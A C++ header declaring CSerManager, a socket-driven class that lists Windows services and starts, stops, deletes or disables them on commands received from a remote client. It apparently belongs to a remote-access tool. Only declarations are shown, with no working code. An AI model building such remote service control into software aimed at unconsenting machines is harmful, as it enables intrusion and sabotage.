// SerManager.h: interface for the CSerManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SerManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
#define AFX_SerManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CSerManager : public CManager  
{
public:
	CSerManager(CClientSocket *pClient);
	virtual ~CSerManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

private:
	LPBYTE getServerList();

	void SendServicesList();

	void StartStopService(LPBYTE lpBuffer, UINT nSize ,BOOL strp);
//	void CreatService(LPBYTE lpBuffer, UINT nSize);
	void DeleteService(LPBYTE lpBuffer, UINT nSize);
	void DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn);
};

#endif // !defined(AFX_SerManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
